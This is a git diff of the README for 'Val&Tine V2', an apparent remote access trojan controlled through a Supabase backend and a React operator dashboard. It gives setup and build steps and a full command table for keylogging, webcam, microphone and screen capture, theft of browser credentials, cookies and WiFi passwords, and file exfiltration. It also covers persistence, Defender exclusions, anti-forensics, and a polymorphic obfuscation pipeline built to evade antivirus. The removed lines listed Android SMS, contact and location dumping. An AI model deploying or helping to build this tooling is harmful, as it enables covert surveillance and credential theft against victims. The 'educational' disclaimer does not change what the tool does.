@@ -1,225 +1,306 @@
-# Val-Tine V2
+# 💘Val&Tine V2 - Machine Management System
 
-Remote administration tool with Supabase-based C2 infrastructure. Supports Windows and Android targets with a React dashboard for management.
+A sophisticated, cross-platform remote machine management framework utilizing a custom Supabase backend for command and control (C2). Val&Tine V2 provides a modern web-based dashboard for fleet management, real-time surveillance, and rapid data exfiltration.
+
+![Version](https://img.shields.io/badge/version-2.0.0-red)
+![Go](https://img.shields.io/badge/Go-1.21+-00ADD8?logo=go)
+![Supabase](https://img.shields.io/badge/supabase-C2-%233FCF8E?logo=supabase)
+
+---
+
+## Table of Contents
+
+- [Features](#features)
+- [Architecture](#architecture)
+- [Prerequisites](#prerequisites)
+- [Quick Start](#quick-start)
+- [Manual Setup](#manual-setup-without-setuppy)
+- [Usage Guide](#usage-guide)
+- [Command Reference](#command-reference)
+- [Project Structure](#project-structure)
+- [Credits](#credits)
+- [Disclaimer](#disclaimer)
+
+---
+
+## Features
+
+### Core Capabilities
+- **Custom C2 Infrastructure**: Migrated from Discord API to a dedicated Supabase backend for total control, reliability, and data privacy.
+- **Real-Time Dashboard**: Modern React-based UI built with Lovable.dev, featuring live updates via Supabase Realtime subscriptions.
+- **Multi-Client Management**: Monitor and control hundreds of machines simultaneously with batch command execution.
+- **Encrypted Communications**: AES-256 encrypted command streams (optional implementation in payload).
+
+### Surveillance Suite
+- **Remote Shell**: Execute commands via native Windows API `CreateProcess` with Anonymous Pipes for I/O redirection (stealthier than `exec.Command`).
+- **Screen Capture**: Native GDI `BitBlt` implementation compiled directly into the binary — no external FFmpeg dependency required for screenshots.
+- **Webcam & Microphone**: Optional FFmpeg integration for media capture.
+- **Keylogger**: Low-level `GetAsyncKeyState` hooking with active window context tracking.
+- **Clipboard Monitoring**: Periodic clipboard content extraction.
+
+### Exfiltration Tools
+- **File Manager**: Browse, upload, and download files with chunked transfer support (bypasses file size limits).
+- **Browser Data**: Extract history, cookies, and saved credentials (Chrome, Edge, Firefox).
+- **Credential Harvesting**: WiFi passwords, system info, and user data.
+
+### System Control
+- **Persistence**: Startup folder VBS stager — no registry keys, no file copies.
+- **UAC Elevation**: `ShellExecuteW` "runas" elevation — current session exits so the elevated process acquires the mutex and connects as admin.
+- **Defender Exclusion**: `MpCmdRun.exe` direct exclusion — avoids PowerShell/AMSI entirely.
+- **Anti-Forensics**: Clear temp files, PowerShell history, RunMRU, and Recycle Bin.
+- **Anti-Analysis**: VM detection (MAC address, registry, BIOS), debugger checks, and analysis tool detection (Process Hacker, Wireshark, etc.).
+
+### Build Pipeline (obfus.py)
+- **Custom Bytecode VM**: Stager logic encoded as bytecode interpreted by a randomized VM — static analysis sees a generic interpreter loop, not the actual operations.
+- **Polymorphic Opcodes**: Each build assigns random byte values to all 12 VM opcodes. No two builds share the same instruction set.
+- **Multi-Layer Encryption**: Payload encrypted with XOR + RC4 (two keys). Bytecode blob XOR'd with a runtime key. Inline data obfuscated with a per-build key.
+- **All Identifiers Randomized**: Every function name, variable name, and parameter name is unique per build.
+- **No Plaintext Strings**: All string literals stored as XOR-encoded byte arrays decoded at runtime.
+- **Dead Code Injection**: 5-8 junk functions + 4-6 fake VM opcodes to confuse analysis.
+- **Indirect Execution**: Uses `ShellExecuteW` via syscall — no `os/exec` import, avoids dropper heuristics.
+
+---
 
 ## Architecture
 
 ```
-┌──────────────┐     ┌──────────────┐     ┌──────────────┐
-│   Dashboard   │────▶│   Supabase   │◀────│    Agent     │
-│   (React)     │     │   (C2 API)   │     │  (Go binary) │
-└──────────────┘     └──────────────┘     └──────────────┘
-                           ▲
-                           │
-                     ┌─────┴─────┐
-                     │   Edge     │
-                     │ Functions  │
-                     └───────────┘
++-------------------+         +------------------+         +---------------------+
+|   Target Machine  | <-----> |   Supabase DB    | <-----> |  Operator Dashboard |
+|   (Go Payload)    |   HTTPS |   (PostgreSQL)   |   HTTPS |   (React/Vite)      |
++-------------------+         +------------------+         +---------------------+
+        |                            |                            |
+        | 1. Beacon / Register       |                            |
+        | 2. Fetch Commands          |                            |
+        | 3. Execute & Upload Result |                            |
+        | 4. Upload Files/Screens    |                            |
+        +----------------------------+                            |
+                                     <----------------------------+
+                                              1. View Fleet Status
+                                              2. Issue Commands
+                                              3. View Screenshots/Logs
 ```
 
-- **Dashboard** — React web UI for managing clients, sending commands, viewing results
-- **Supabase** — Backend (Postgres DB + REST API + Edge Functions + Storage)
-- **Windows Agent** — Go binary with polymorphic VM stager (obfus.py)
-- **Android Agent** — Go binary packaged inside APK as native library
+---
 
 ## Prerequisites
 
-- [Go](https://go.dev/dl/) 1.21+
-- [Node.js](https://nodejs.org/) 18+ & npm
-- [Supabase CLI](https://supabase.com/docs/guides/cli) (`npx supabase`)
-- Python 3.8+
+- **Go** 1.21+ — [go.dev/dl](https://go.dev/dl/)
+- **Node.js & npm** 18+ — for the web dashboard
+- **Python 3.10+** — for the build/setup tool
+- **Supabase account** — [supabase.com](https://supabase.com) (free tier works)
+- **Python `requests`** — `pip install requests`
 
-**For Android builds:**
-- [Android SDK](https://developer.android.com/studio) (build-tools, platform SDK 34)
-- Java JDK 11+ (for Gradle/APK signing)
-- `keytool` and `jarsigner` (included with JDK)
+Optional:
+- **Supabase CLI** — for automated migrations/deploys ([install guide](https://supabase.com/docs/guides/cli))
+
+---
 
 ## Quick Start
 
-### 1. Setup Supabase & Config
-
 ```bash
+# 1. Clone
+git clone https://github.com/listentosmoke/val-tine-v2.git
+cd Val-Tine-V2
+
+# 2. Install web dashboard deps
+npm install
+
+# 3. Run setup (configures everything + builds payload)
 python3 setup.py
 ```
 
-This interactive wizard will:
-- Collect your Supabase URL and anon key
-- Log into Supabase CLI
-- Apply SQL migrations and deploy edge functions
-- Update config files (`.env`, `main.go`)
-- Create a dashboard login user
-- Optionally build the Windows payload
+The setup tool will:
+1. Ask for your Supabase project URL and anon key
+2. Optionally configure a secondary Supabase project for redundancy
+3. Configure webhook URL for anti-analysis reporting
+4. Update all config files (`main.go`, `.env`, `obfus.py`)
+5. Run SQL migrations via Supabase CLI (if installed)
+6. Deploy the `file-upload` edge function
+7. Build the payload EXE using the obfuscation pipeline
 
-### 2. Start the Dashboard
+To rebuild later without re-running setup:
+```bash
+python3 setup.py build
+```
+
+---
+
+## Manual Setup (without setup.py)
+
+### 1. Create Supabase Project
+
+1. Log in to [Supabase](https://supabase.com/).
+2. Click **"New Project"**.
+3. Name it (e.g., `val-tine-c2`). Set a strong database password. Remember this password — the CLI will ask for it.
+4. Select a region close to you and wait for it to provision.
+
+### 2. Run SQL Migrations
+
+**Option A — CLI setup** (recommended):
+```bash
+npx supabase login
+npx supabase link --project-ref <your-project-ref>
+npx supabase db push
+npx supabase functions deploy file-upload --no-verify-jwt
+```
+
+**Option B — Manual paste**:
+- Go to **SQL Editor** in your Supabase dashboard.
+- Paste and run `supabase/migrations/01_schema.sql` — creates tables, RLS policies, indexes, and realtime subscriptions.
+- Paste and run `supabase/migrations/02_storage.sql` — creates storage buckets and access policies.
+- Deploy the edge function via CLI or paste `supabase/functions/file-upload/index.ts` into **Edge Functions > New Function** in the dashboard.
+
+> **Important**: The `file-upload` edge function is required. Without it, screenshots, screen recordings, and file uploads will silently fail.
+
+### 3. Get Your Credentials
+
+In the Supabase dashboard, go to **Project Overview (scroll down) > Project API**:
+- Copy the **Project URL** — this is your Supabase URL.
+- Copy the **anon public key / Publishable API Key** — this is your anon key.
+
+### 4. Configure Files
+
+Edit `main.go` — replace the placeholder C2 domain config (in the `main()` function, search for `Build config`):
+```go
+Domains: []C2Domain{
+    {
+        URL:      "https://your-project-ref.supabase.co", // PASTE HERE
+        APIKey:   "your-anon-key-here",                   // PASTE HERE
+        Priority: 10,
+    },
+},
+```
+
+Edit `.env` — for the web dashboard:
+```env
+VITE_SUPABASE_URL="https://your-project-ref.supabase.co"
+VITE_SUPABASE_PUBLISHABLE_KEY="your-anon-key-here"
+```
+
+### 5. Create a Dashboard User
+
+In the Supabase dashboard, go to **Authentication > Users**:
+- Click **"Add User"** and select **"Create New User"**.
+- Enter an email and password — these will be your login credentials for the dashboard.
+
+### 6. Frontend Dashboard
 
 ```bash
 npm install
 npm run dev
 ```
 
-Open `http://localhost:5173` and log in with the credentials you set during setup.
+Open `http://localhost:5173` in your browser.
 
-## Building Payloads
+**Deploy (Optional)**: Push to GitHub and connect to Vercel/Netlify. Set `VITE_SUPABASE_URL` and `VITE_SUPABASE_PUBLISHABLE_KEY` in your hosting provider's environment variables.
 
-### Windows
-
-The Windows builder uses a 4-stage polymorphic pipeline:
+### 7. Build Payload
 
 ```bash
 python3 obfus.py
 ```
 
-**Before building:** Edit `main.go` and paste your Supabase URL + anon key in the config section (search for `PASTE YOUR SUPABASE URL`).
+The final `.exe` is placed in your current directory.
 
-**Stages:**
-1. Compile Go agent → dual-layer encrypt (XOR + RC4) → upload to temp hosting
-2. Shorten payload URL
-3. Generate polymorphic VM bytecode with randomized opcodes
-4. Generate polymorphic Go stager → compile to EXE
+---
 
-Each build produces a unique binary — different opcodes, identifiers, encryption keys, junk code.
+## Usage Guide
 
-**Output:** `SetupHost_XXX.exe` (or similar random name)
+### Operating the Dashboard
 
-### Android
+1. **Dashboard View**:
+   - When you open the site, you see the **Fleet Overview**.
+   - Machines running the payload will appear here automatically within 30 seconds.
+   - Status Indicators: Online, Idle, Offline.
 
-The Android builder compiles the Go agent and packages it inside a signed APK:
+2. **Control Panel**:
+   - Click a machine row to open the **Control Panel**.
+   - **System Info**: View hardware, network, and OS details.
+   - **Remote Shell**: Type commands and see output in real-time.
+   - **Surveillance**: View screenshots, webcam feeds, and keylogs.
+   - **File Manager**: Browse the file system and exfiltrate data.
 
-```bash
-python3 build_android.py
-```
+3. **Batch Commands**:
+   - Use the checkboxes on the left of the table to select multiple machines.
+   - Use the **Batch Action Bar** to send commands to all selected machines at once.
 
-**Config is read from `.env`** (created by `setup.py`), or pass directly:
+---
 
-```bash
-python3 build_android.py --domain yourproject.supabase.co --apikey eyJ...
-```
+## Command Reference
 
-**Options:**
-```
---domain    Primary Supabase domain
---domain2   Secondary domain (redundancy)
---apikey    Supabase anon key
---arch      Target architecture: arm64 (default), arm, x86_64, x86
---output    Output filename (default: DeviceHealth.apk)
-```
+| Command | Description |
+| :--- | :--- |
+| `sysinfo` | Gather and upload full system specifications |
+| `isadmin` | Check if running with admin privileges |
+| `screenshot` | Capture a single screenshot of the desktop |
+| `screenshots` | Start continuous screenshot capture (every 30s) |
+| `keycapture` / `keylog_start` | Start the background keylogger |
+| `keylog_stop` | Stop the keylogger |
+| `persist` | Add persistence (Startup folder VBS stager) |
+| `unpersist` | Remove persistence |
+| `elevate` | Attempt UAC elevation to gain admin privileges |
+| `excludec` | Exclude C:\\ from Defender scans (via MpCmdRun.exe) |
+| `excludeall` | Exclude C:\\ through G:\\ from Defender |
+| `cleanup` | Clear temp files, history, and recycle bin |
+| `browserdb` | Exfiltrate browser databases (Chrome, Edge, Firefox) |
+| `parsebrowser` | Parse browser data locally |
+| `exfiltrate` | Exfil files (args: path, extensions, max_size) |
+| `download` | Download file from client (args: path) |
+| `upload` | Upload file to client (args: path, data) |
+| `foldertree` | Show folder trees for Desktop/Docs/Downloads |
+| `webcam` | Start webcam capture job |
+| `microphone` | Start microphone recording job |
+| `recordscreen` | Record screen video (args: seconds) |
+| `wifi` | Show saved WiFi networks + passwords |
+| `nearbywifi` | Show nearby WiFi networks |
+| `enumeratelan` | Scan LAN for devices |
+| `shell` | Execute raw shell command |
+| `processes` | List running processes |
+| `jobs` | List running background jobs |
+| `pausejobs` | Stop all background jobs |
+| `resumejobs` | Resume default jobs |
+| `kill` | Kill a process (args: pid) or stop a job (args: job) |
+| `enableio` | Enable keyboard/mouse (admin) |
+| `disableio` | Disable keyboard/mouse (admin) |
+| `message` | Show message box on target |
+| `wallpaper` | Set wallpaper from URL |
+| `minimizeall` | Minimize all windows |
+| `darkmode` / `lightmode` | Toggle dark/light mode |
+| `shortcutbomb` | Create 50 fake USB shortcuts on Desktop |
+| `fakeupdate` | Show fake Windows update screen |
+| `soundspam` | Play all Windows system sounds |
+| `antianalysis` | VM/debugger/tools detection report |
+| `ping` | Connection test |
+| `sleep` | Sleep N seconds |
+| `exit` | Terminate the payload |
 
-**Stages:**
-1. Compile Go agent for android/arm64 with config injected
-2. Package as `libagent.so` in APK via Gradle
-3. Sign with debug keystore (auto-generated) + v2 apksigner
-
-**Output:** `DeviceHealth.apk`
-
-**Install on device:**
-```bash
-adb install DeviceHealth.apk
-```
-
-**Android SDK setup:**
-Set `ANDROID_HOME` environment variable, or the builder will auto-detect from common paths (`~/Android/Sdk`, etc.).
+---
 
 ## Project Structure
 
 ```
-├── main.go                 # Windows agent (Go)
-├── obfus.py                # Windows polymorphic builder
-├── build_android.py        # Android APK builder
-├── setup.py                # Interactive setup wizard
-├── .env                    # Supabase config (created by setup.py)
-├── src/                    # Dashboard (React + Vite)
-│   ├── pages/
-│   │   ├── Dashboard.tsx   # Client list & management
-│   │   └── Client.tsx      # Per-client command interface
-│   ├── hooks/              # React hooks (useClients, etc.)
-│   ├── lib/                # Utilities (commands, supabase client)
-│   └── components/         # UI components
-├── android/                # Android APK project
-│   ├── agent/
-│   │   └── main.go         # Android Go agent
-│   ├── app/
-│   │   ├── build.gradle
-│   │   └── src/main/
-│   │       ├── AndroidManifest.xml
-│   │       └── java/com/devicehealth/service/
-│   │           ├── MainActivity.java
-│   │           ├── AgentService.java
-│   │           └── BootReceiver.java
-│   ├── build.gradle
-│   └── settings.gradle
-└── supabase/               # Supabase migrations & edge functions
-    ├── migrations/
-    └── functions/
+main.go              - Go payload (RAT agent)
+obfus.py             - Polymorphic VM-based build pipeline
+setup.py             - Interactive setup & build CLI
+.env                 - Web dashboard Supabase config
+src/                 - React/TypeScript web dashboard
+supabase/
+  migrations/        - SQL schema + storage setup
+  functions/         - Edge functions (file-upload)
 ```
 
-## Agent Commands
+---
 
-Commands are sent from the dashboard and executed on target devices.
+## Credits
 
-### Common Commands (Windows + Android)
+- **[Beigeworm](https://github.com/beigeworm)** — Original PowerShell payload and C2 framework that inspired this project.
 
-| Command | Description |
-|---------|-------------|
-| `ping` | Connection test |
-| `shell` | Execute shell command |
-| `sysinfo` | Full system information |
-| `isadmin` | Check privileges (admin/root) |
-| `screenshot` | Single screenshot |
-| `screenshots` | Continuous screenshots (background job) |
-| `microphone` | Record audio |
-| `wifi` | WiFi info and saved networks |
-| `download` | Download file from target |
-| `upload` | Upload file to target |
-| `exfiltrate` | Bulk file exfiltration |
-| `foldertree` | List directory contents |
-| `persist` | Install persistence |
-| `unpersist` | Remove persistence |
-| `cleanup` | Clear traces |
-| `sleep` | Sleep N seconds |
-| `antianalysis` | VM/debugger detection report |
-| `jobs` | List active background jobs |
-| `kill` | Stop a background job |
-| `pausejobs` | Stop all jobs |
-| `resumejobs` | Resume default jobs |
-| `options` | Show available commands |
-| `exit` | Kill agent |
+---
 
-### Windows-Only Commands
+## Disclaimer
 
-| Command | Description |
-|---------|-------------|
-| `elevate` | UAC elevation |
-| `excludec` | Add Defender exclusion for C:\\ |
-| `excludeall` | Add Defender exclusions C:-G:\\ |
-| `webcam` | Capture from webcam |
-| `keycapture` | Start keylogger |
-| `recordscreen` | Record screen video |
-| `browserdb` | Exfiltrate browser databases |
-| `parsebrowser` | Extract browser URLs/logins |
-| `nearbywifi` | Scan nearby WiFi networks |
-| `enumeratelan` | LAN discovery (ping sweep) |
-| `message` | Show message box |
-| `wallpaper` | Change wallpaper |
-| `vnc_start` | Start remote desktop |
-| `vnc_stop` | Stop remote desktop |
-| `darkmode` | Switch to dark mode |
-| `lightmode` | Switch to light mode |
-| `shortcutbomb` | Create desktop shortcuts |
-| `fakeupdate` | Open fake update page |
-| `soundspam` | Play system sounds |
+**This tool is intended for EDUCATIONAL and RESEARCH purposes only.**
 
-### Android-Only Commands
+The use of this software to target systems that you do not own or have explicit permission to test is illegal. The developers and contributors assume no liability and are not responsible for any misuse or damage caused by this program. By using this software, you agree to comply with all applicable local, state, and federal laws.
 
-| Command | Description |
-|---------|-------------|
-| `contacts` | Dump contacts |
-| `sms_dump` | Dump SMS messages |
-| `calllog` | Dump call log |
-| `apps` | List installed apps |
-| `location` | Get last known location |
-| `location_track` | Continuous GPS tracking |
-| `clipboard` | Read clipboard |
-| `camera` | Take photo |
-| `toast` | Show toast message |
-| `openurl` | Open URL in browser |
-| `vibrate` | Vibrate device |
+**Unauthorized access to computer systems is a crime.**
